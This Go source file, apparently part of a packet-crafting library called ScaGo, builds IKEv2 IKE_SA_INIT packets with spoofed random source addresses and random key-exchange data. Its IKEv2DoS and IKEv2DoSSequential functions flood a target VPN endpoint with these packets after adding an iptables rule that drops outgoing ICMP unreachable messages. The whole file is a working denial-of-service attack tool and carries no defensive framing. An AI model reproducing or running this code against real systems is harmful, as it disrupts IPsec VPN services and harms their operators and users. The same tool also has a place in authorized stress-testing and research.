package higherlevel

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	golayers "github.com/google/gopacket/layers"
	"github.com/tiagomdiogo/ScaGo/packet"
	communication "github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
	"os/exec"
	"sync"
)

func CraftIKEv2Packet(destIP, destMAC, srcMAC, srcIP string) ([]byte, error) {
	// ETHER , IP and UDP Layers
	etherLayer := packet.EthernetLayer()
	etherLayer.SetSrcMAC(srcMAC)
	etherLayer.SetDstMAC(destMAC)
	etherLayer.SetEthernetType(golayers.EthernetTypeIPv4)

	ipLayer := packet.IPv4Layer()
	ipLayer.SetSrcIP(utils.ParseIPGen())
	ipLayer.SetDstIP(destIP)

	udpLayer := packet.UDPLayer()
	udpLayer.SetSrcPort("500")
	udpLayer.SetDstPort("500")

	// PAYLOAD HEADER
	header := packet.IKEv2PayloadHeaderLayer()

	//TRANSFORMS
	transENCR := packet.IKEv2TransformLayer()
	transPRF := packet.IKEv2TransformLayer()
	transINT := packet.IKEv2TransformLayer()
	transDH := packet.IKEv2TransformLayer()
	if err := header.SetNextPayload(3); err != nil {
		fmt.Println(err)
	}
	transENCR.SetHeader(header)
	transPRF.SetHeader(header)
	transINT.SetHeader(header)
	if err := header.SetNextPayload(0); err != nil {
		fmt.Println(err)
	}
	transDH.SetHeader(header)

	if err := transENCR.SetTransformType(1); err != nil {
		fmt.Println(err)
	}
	if err := transPRF.SetTransformType(2); err != nil {
		fmt.Println(err)
	}
	if err := transINT.SetTransformType(3); err != nil {
		fmt.Println(err)
	}
	if err := transDH.SetTransformType(4); err != nil {
		fmt.Println(err)
	}
	if err := transENCR.SetTransformID(12, 256); err != nil {
		fmt.Println(err)
	}
	if err := transPRF.SetTransformID(7); err != nil {
		fmt.Println(err)
	}
	if err := transINT.SetTransformID(14); err != nil {
		fmt.Println(err)
	}
	if err := transDH.SetTransformID(16); err != nil {
		fmt.Println(err)
	}

	// PROPOSAL
	prop := packet.IKEv2ProposalLayer()
	if err := header.SetNextPayload(0); err != nil {
		fmt.Println(err)
	}
	prop.SetHeader(header)
	prop.SetProposalNb(1)
	if err := prop.SetProtocolID(1); err != nil {
		fmt.Println(err)
	}
	prop.AddTransform(transENCR, transPRF, transINT, transDH)

	// NONCE PAYLOAD
	noncepayload := packet.IKEv2NonceLayer()
	noncepayload.SetHeader(header)
	nonce, _ := hex.DecodeString("8dfcf8384c5c32f1b294c64eab69f98e9d8cf7e7f352971a91ff6777d47dffed")
	noncepayload.SetNonce(nonce[:])

	//KE PAYLOAD
	keyExchange := make([]byte, 512)
	rand.Read(keyExchange)
	kepayload := packet.IKEv2KELayer()
	if err := header.SetNextPayload(40); err != nil {
		fmt.Println(err)
	}
	kepayload.SetHeader(header)
	if err := kepayload.SetDHGroup(16); err != nil {
		fmt.Println(err)
	}
	kepayload.SetKE(keyExchange)

	// SA PAYLOAD
	sapayload := packet.IKEv2SALayer()
	if err := header.SetNextPayload(34); err != nil {
		fmt.Println(err)
	}
	sapayload.SetHeader(header)
	sapayload.AddProposal(prop)

	// IKEv2 PACKET
	ikelayer := packet.IKEv2Layer()
	var spi uint64
	binary.Read(rand.Reader, binary.BigEndian, &spi)
	ikelayer.SetInitSPI(spi)
	if err := ikelayer.SetNextPayload(33); err != nil {
		fmt.Println(err)
	}
	ikelayer.SetVersion(0x20)
	if err := ikelayer.SetExchType(34); err != nil {
		fmt.Println(err)
	}
	ikelayer.SetFlags(0x08)
	ikelayer.SetID(00000000)

	if err := kepayload.SetPayload(noncepayload); err != nil {
		fmt.Println(err)
	}
	if err := sapayload.SetPayload(kepayload); err != nil {
		fmt.Println(err)
	}
	if err := ikelayer.SetPayload(sapayload); err != nil {
		fmt.Println(err)
	}
	ikelayer.CalculateLength()
	pkt, err := packet.CraftPacket(etherLayer.Layer(), ipLayer.Layer(), udpLayer.Layer(), ikelayer.Layer())

	return pkt, err
}

func IKEv2DoS(npackets int, destIP, iface string) {
	exec.Command("iptables", "-A", "OUTPUT", "-p", "icmp", "--icmp-type", "destination-unreachable", "-j", "DROP").Run()
	packets := make([][]byte, npackets)
	destMAC, _ := packet.ARPScanHost("eth0", destIP)
	srcMAC := utils.MacByInt(iface)
	srcIP := utils.IPbyInt(iface)
	var wg sync.WaitGroup
	var mutex sync.Mutex
	for i := 0; i < npackets; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			mutex.Lock()
			pkt, err := CraftIKEv2Packet(destIP, destMAC, srcMAC, srcIP)
			mutex.Unlock()
			if err != nil {
				fmt.Println("Error crafting IKEv2 packet: ", err)
				return
			}
			packets[i] = pkt
		}(i)
	}
	wg.Wait()
	communication.SendMultiplePackets(packets, iface, 10)
}

func IKEv2DoSSequential(npackets int, destIP, iface string) {
	exec.Command("iptables", "-A", "OUTPUT", "-p", "icmp", "--icmp-type", "destination-unreachable", "-j", "DROP").Run()
	packets := make([][]byte, npackets)
	destMAC, _ := packet.ARPScanHost("eth0", destIP)
	srcMAC := utils.MacByInt(iface)
	srcIP := utils.IPbyInt(iface)
	for i := 0; i < npackets; i++ {
		pkt, err := CraftIKEv2Packet(destIP, destMAC, srcMAC, srcIP)
		if err != nil {
			fmt.Println("Error crafting IKEv2 packet: ", err)
			return
		}
		packets[i] = pkt
	}
	communication.SendMultiplePackets(packets, iface, 1)
}
